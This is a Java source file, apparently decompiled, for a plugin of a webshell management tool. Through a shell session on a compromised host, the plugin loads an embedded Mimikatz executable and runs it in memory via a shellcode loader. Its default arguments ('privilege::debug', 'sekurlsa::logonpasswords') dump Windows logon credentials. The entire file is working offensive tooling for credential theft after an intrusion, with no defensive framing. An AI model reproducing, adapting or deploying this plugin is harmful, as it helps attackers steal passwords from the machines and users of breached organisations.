package shells.plugins.generic;

import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;

public abstract class Mimikatz
  implements Plugin
{
  private final JPanel panel;
  private final JLabel argsLabel;
  private final JTextField argsTextField;
  private final JButton runButton;
  private final JSplitPane splitPane;
  
  public Mimikatz() {
    this.panel = new JPanel(new BorderLayout());
    this.argsLabel = new JLabel("args");
    this.argsTextField = new JTextField(" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" ");
    this.runButton = new JButton("Run");
    this.resultTextArea = new RTextArea();
    this.splitPane = new JSplitPane();
    
    this.splitPane.setOrientation(0);
    this.splitPane.setDividerSize(0);
    
    JPanel topPanel = new JPanel();
    topPanel.add(this.argsLabel);
    topPanel.add(this.argsTextField);
    topPanel.add(this.runButton);
    
    this.splitPane.setTopComponent(topPanel);
    this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
    
    this.splitPane.addComponentListener(new ComponentAdapter()
        {
          public void componentResized(ComponentEvent e) {
            Mimikatz.this.splitPane.setDividerLocation(0.15D);
          }
        });
    
    this.panel.add(this.splitPane);
  }

  
  private final RTextArea resultTextArea;
  private boolean loadState;
  protected ShellEntity shellEntity;
  
  private void runButtonClick(ActionEvent actionEvent) {
    if (this.loader == null) {
      this.loader = getShellcodeLoader();
    }
    
    if (this.loader == null) {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
      
      return;
    } 
    
    byte[] pe = functions.readInputStreamAutoClose(Mimikatz.class.getResourceAsStream("assets/mimikatz-" + (this.payload.isX64() ? "64" : "32") + ".exe"));
    
    try {
      byte[] result = this.loader.runPe2(this.argsTextField.getText().trim(), pe, 6000);
      this.resultTextArea.setText(this.encoding.Decoding(result));
    } catch (Exception e) {
      GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), e.getMessage());
    } 
  }
  protected Payload payload; private Encoding encoding; private ShellcodeLoader loader;
  
  public void init(ShellEntity shellEntity) {
    this.shellEntity = shellEntity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    automaticBindClick.bindJButtonClick(Mimikatz.class, this, Mimikatz.class, this);
  }



  
  public JPanel getView() {
    return this.panel;
  }
  
  protected abstract ShellcodeLoader getShellcodeLoader();
}
